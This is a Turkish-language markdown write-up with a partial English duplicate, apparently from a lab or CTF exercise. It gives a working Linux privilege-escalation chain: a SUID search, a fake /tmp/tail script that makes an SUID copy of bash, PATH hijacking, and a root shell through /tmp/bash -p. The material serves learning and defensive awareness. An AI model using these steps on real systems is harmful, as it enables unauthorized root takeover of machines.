``` bash
echo "abcx==" |  base64 -d 
```

# Linux'ta 2>/dev/null komutu, hata mesajlarını (stderr - standart hata çıkışı) yok saymak için kullanılır.
```bash
2>/dev/null
```
---
# Privilege Escalation: Exploiting SUID Misconfiguration

## Overview
In this guide, we will exploit a misconfigured SUID binary to escalate privileges and gain root access. This method leverages **PATH hijacking** to execute a malicious script with elevated permissions.

---

## Step 1: Finding SUID Binaries
We start by searching for **SUID** binaries on the system:
```bash
find / -type f -perm -u=s 2>/dev/null
```
This command looks for files with the **SUID bit set**, allowing them to run with their owner's privileges.

From our scan, we find an interesting binary:
```bash
/home/joe/live_log
```

---
# Linux Privilege Escalation (PATH Hijacking)  

Bu yazıda, bir Linux sisteminde **SUID ve PATH Hijacking** kullanarak nasıl yetki yükseltme yapılacağını adım adım anlatacağız.  

## 🔒 Amaç  
Sistemdeki bir hatayı kullanarak, **normal kullanıcıdan root yetkisine yükselmek**.  

---

## ✅ 1. Sistemdeki SUID Dosyalarını Bulma  
SUID bitine sahip dosyaları aramak için aşağıdaki komutu çalıştırıyoruz:  
```bash
find / -type f -perm -u=s 2>/dev/null
```
Bu komut, başkalarının çalıştırabildiği ancak **sahibinin yetkileriyle çalışan** dosyaları listeler.  

Burada ilginç bir SUID dosyası bulduk:  
```bash
/home/joe/live_log
```
Bu dosyanın içeriğini analiz ettiğimizde şu komutun çalıştırıldığını görüyoruz:  
```bash
tail -f /var/log/nginx/access.log
```
**Hata:** Burada `tail` komutunun **tam yolu belirtilmemiş!** Yani `/usr/bin/tail` yerine sadece `tail` yazılmış.  
Bu, **PATH değiştirerek exploit edebileceğimiz** bir güvenlik açığı oluşturuyor.  

---

## ⚙️ 2. Sahte tail Dosyamızı Yazalım  
Sistemi kandırıp, bizim oluşturduğumuz **sahte tail** dosyasını çalıştırmasını sağlayacağız.  

1. `/tmp` dizinine giderek sahte bir `tail` dosyası oluşturuyoruz:  
   ```bash
   nano /tmp/tail
   ```
   İçine şu kodu yazıyoruz:  
   ```bash
   #!/bin/bash
   cp /bin/bash /tmp/bash
   chmod +s /tmp/bash
   ```
   Bu kod, **bash dosyasını kopyalar ve ona root yetkisi verir.**  

2. Dosyayı çalıştırılabilir hale getiriyoruz:  
   ```bash
   chmod +x /tmp/tail
   ```

---

## 🛠️ 3. PATH Değiştirerek Sistemi Kandırmak  
Şimdi, **sistem bizim sahte tail dosyamızı çalıştırması için** PATH değiştiriyoruz:  
```bash
export PATH=/tmp:$PATH
```
Böylece sistem **tail** komutunu çalıştırmak istediğinde, önce `/tmp` dizinine bakacak ve **bizim sahte tail dosyamızı çalıştıracak!**  

---

## 🚀 4. Exploiti Çalıştırma  
Şimdi **live_log dosyasını çalıştırıyoruz**:  
```bash
/home/joe/live_log
```
Bu komut normalde `tail` çalıştırmalı ama **bizim sahte tail dosyamızı çalıştırıyor** ve `/tmp/bash` adında bir dosya oluşturup ona **root yetkisi** veriyor!  

---

## 🔐 5. Root Yetkilerini Almak  
Son olarak oluşturduğumuz özel `bash` dosyasını çalıştırıyoruz:  
```bash
/tmp/bash -p
```
Ve artık **root yetkisini aldık!**  
Bunu doğrulamak için:  
```bash
id
```
Çıktı şöyle olmalı:  
```
uid=0(root) gid=0(root) groups=0(root)
```
**Artık sistemde tam kontrolümüz var!** 🎉  

---

## 📑 Özet  
1. Sistemde `live_log` adlı bir SUID dosyası bulduk.  
2. Bu dosya `tail -f` komutunu çalıştırıyor ama tam yolu belirtilmemiş.  
3. `/tmp/tail` adında bir sahte dosya oluşturduk.  
4. PATH değiştirerek sistemin bizim sahte `tail` dosyamızı çalıştırmasını sağladık.  
5. Sahte `tail`, root yetkili bir `bash` oluşturdu.  
6. O **bash**'i çalıştırarak **root olduk!** 🚀  

**Sistem güvenliğini artırmak için,** SUID dosyalarını düzenli kontrol etmeli ve sistemin güvenlik açıklarını kapatmalısınız! ⚠️  




